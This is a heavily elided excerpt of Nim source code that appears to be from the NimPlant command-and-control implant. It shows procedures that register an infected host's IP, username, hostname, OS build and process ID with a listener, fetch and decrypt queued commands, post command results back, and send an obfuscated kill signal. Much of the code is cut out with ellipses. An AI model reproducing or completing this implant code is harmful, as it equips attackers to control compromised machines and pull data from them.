    ...
    try:
        ...
        # POST request
            ...
            let req = Request(
                ...
                body: "{\"id\": \"" & li.id & "\", \"" & postKey & "\":\"" & postValue & "\"}"
                )
            return fetch(req)
...
proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, riskyMode : bool) : void =
...
proc getQueuedCommand*(li : Listener) : (string, seq[string]) =
    var 
    ...
    # Otherwise, parse task and arguments (if any)
        ...
        try:
            # A task has been returned
            var responseData = decryptData(parseJson(res.body)["task"].getStr(), li.cryptKey)
            try: 
                # Arguments are included with the task
                cmd = responseData.split(' ', 1)[0].toLower()
                args = parseCmdLine(responseData.split(' ', 1)[1])
            except:
...
proc postCommandResults*(li : Listener, data : string) : void =
...
proc killSelf*(li : Listener) : void =
    discard doRequest(li, li.resultPath, "data", encryptData(obf("NIMPLANT_KILL_TIMER_EXPIRED"), li.cryptKey))